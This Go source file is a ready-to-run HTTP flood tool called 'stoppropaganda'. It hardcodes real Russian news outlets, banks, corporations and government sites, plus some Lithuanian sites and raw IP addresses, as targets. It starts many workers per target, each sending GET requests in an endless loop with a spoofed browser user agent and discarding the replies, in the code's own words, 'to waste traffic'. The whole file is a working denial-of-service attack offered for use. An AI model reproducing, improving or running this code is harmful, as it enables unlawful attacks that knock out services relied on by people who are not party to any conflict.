package main

import (
	"encoding/json"
	"flag"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"sync"
	"time"

	"github.com/peterbourgon/ff/v3"
)

// https://twitter.com/FedorovMykhailo/status/1497642156076511233
var links = []string{
	// Propaganda
	"https://lenta.ru/",
	"https://ria.ru/",
	"https://ria.ru/lenta/",
	"https://www.rbc.ru/",
	"https://www.rt.com/",
	"https://smotrim.ru/",
	"https://tass.ru/",
	"https://tvzvezda.ru/",
	"https://vsoloviev.ru/",
	"https://www.1tv.ru/",
	"https://www.vesti.ru/",
	"https://zakupki.gov.ru/",
	"https://er.ru/",
	"https://www.rzd.ru/",
	"https://rzdlog.ru/",
	"https://vgtrk.ru/",
	"https://www.interfax.ru/",
	"https://ugmk.ua/",
	"https://iz.ru/",
	"https://vz.ru/",
	"https://sputniknews.ru",
	"https://www.gazeta.ru/",
	"https://www.kp.ru/",
	"https://riafan.ru/",
	"https://pikabu.ru/",
	"https://www.kommersant.ru/",
	"https://omk.ru",
	"https://www.yaplakal.com/",
	"https://bezformata.com/",
	"https://bukimevieningi.lt/",
	"https://musutv.lt/",

	// Business corporations
	"https://www.gazprom.ru",
	"https://lukoil.ru",
	"https://magnit.ru",
	"https://www.nornickel.com",
	"https://www.surgutneftegas.ru",
	"https://www.tatneft.ru",
	"https://www.evraz.com/ru",
	"https://nlmk.com",
	"https://www.sibur.ru",
	"https://www.severstal.com",
	"https://www.metalloinvest.com",
	"https://nangs.org",
	"https://rmk-group.ru/ru",
	"https://www.tmk-group.ru",
	"https://ya.ru",
	"https://www.polymetalinternational.com/ru",
	"https://www.uralkali.com/ru",
	"https://www.eurosib.ru",

	// Banks
	"https://www.sberbank.ru",
	"https://online.sberbank.ru/",
	"https://www.vtb.ru",
	"https://www.gazprombank.ru",
	"https://api.developer.sber.ru/product/SberbankID",
	"https://api.sberbank.ru/prod/tokens/v2",

	//The state
	"https://gosuslugi.ru",
	"https://www.mos.ru/uslugi",
	"http://kremlin.ru",
	"http://en.kremlin.ru/",
	"http://government.ru",
	"https://mil.ru",
	"https://www.nalog.gov.ru/",
	"https://customs.gov.ru/",
	"https://pfr.gov.ru/",
	"https://rkn.gov.ru/",

	// Others
	"https://109.207.1.118/",
	"https://109.207.1.97/",
	"https://mail.rkn.gov.ru",
	"https://cloud.rkn.gov.ru",
	"https://mvd.gov.ru",
	"https://pwd.wto.economy.gov.ru",
	"https://stroi.gov.ru",
	"https://proverki.gov.ru",
}

type Website struct {
	Link         string `json:"url"`
	Requests     uint   `json:"requests"`
	Errors       uint   `json:"errors"`
	LastErrorMsg string `json:"last_error_msg"`

	Counter_code100 uint `json:"status_100"`
	Counter_code200 uint `json:"status_200"`
	Counter_code300 uint `json:"status_300"`
	Counter_code400 uint `json:"status_400"`
	Counter_code500 uint `json:"status_500"`

	mux *sync.RWMutex
}

var websites = []*Website{}

var httpClient http.Client

var fs = flag.NewFlagSet("stoppropaganda", flag.ExitOnError)
var (
	flagWorkers   = fs.Int("workers", 20, "workers for each website")
	flagUserAgent = fs.String("useragent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36", "User agent used in HTTP requests")
	flagTimeout   = fs.Duration("timeout", 10*time.Second, "timeout of HTTP request")
	flagBind      = fs.String("bind", ":8049", "bind on specific host:port")
)

func main() {
	ff.Parse(fs, os.Args[1:], ff.WithEnvVarPrefix("SP"))

	for _, link := range links {
		w := &Website{
			Link: link,
			mux:  &sync.RWMutex{},
		}
		websites = append(websites, w)
		go w.Start()
	}

	http.HandleFunc("/status", status)
	log.Println("Started!")
	panic(http.ListenAndServe(*flagBind, nil))
}

func status(w http.ResponseWriter, req *http.Request) {
	tmpWebsites := []Website{}
	for _, ws := range websites {
		ws.mux.RLock()
		tmpWebsites = append(tmpWebsites, *ws)
		ws.mux.RUnlock()
	}
	content, err := json.MarshalIndent(tmpWebsites, "", "    ")
	if err != nil {
		http.Error(w, "failed to marshal data", http.StatusInternalServerError)
		return
	}
	w.WriteHeader(200)
	w.Write(content)
}

func (ws *Website) Start() {
	websiteURL, err := url.Parse(ws.Link)
	if err != nil {
		panic(err)
	}

	f := func() {
		for {
			// Create request
			req, err := http.NewRequest("GET", ws.Link, nil)
			if err != nil {
				panic(err)
			}

			// Set headers
			req.Header.Set("Host", websiteURL.Host)
			req.Header.Set("User-Agent", *flagUserAgent)
			req.Header.Set("Accept", "*/*")

			// Perform request
			resp, err := httpClient.Do(req)
			if err != nil {
				ws.mux.Lock()
				ws.Requests++
				ws.Errors++
				ws.LastErrorMsg = err.Error()
				ws.mux.Unlock()
				continue
			}

			// Increase counters
			ws.mux.Lock()
			ws.Requests++
			if resp.StatusCode >= 100 && resp.StatusCode < 200 {
				ws.Counter_code100++
			} else if resp.StatusCode >= 200 && resp.StatusCode < 300 {
				ws.Counter_code200++
			} else if resp.StatusCode >= 300 && resp.StatusCode < 400 {
				ws.Counter_code300++
			} else if resp.StatusCode >= 400 && resp.StatusCode < 500 {
				ws.Counter_code400++
			} else if resp.StatusCode >= 500 && resp.StatusCode < 600 {
				ws.Counter_code500++
			}
			ws.mux.Unlock()

			// Download (and discard) response body to waste traffic
			_, err = io.Copy(ioutil.Discard, resp.Body)
			if err != nil {
				ws.mux.Lock()
				ws.Errors++
				ws.mux.Unlock()
			}
			resp.Body.Close()
		}
	}

	for i := 0; i < *flagWorkers; i++ {
		go f()
	}
}

func init() {
	fIgnoreRedirects := func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	tr := &http.Transport{
		DisableCompression: true,
	}
	httpClient = http.Client{
		Timeout:       *flagTimeout,     // Enable timeout
		CheckRedirect: fIgnoreRedirects, // Disable auto redirects
		Transport:     tr,               // Disable automatic decompression
	}
}
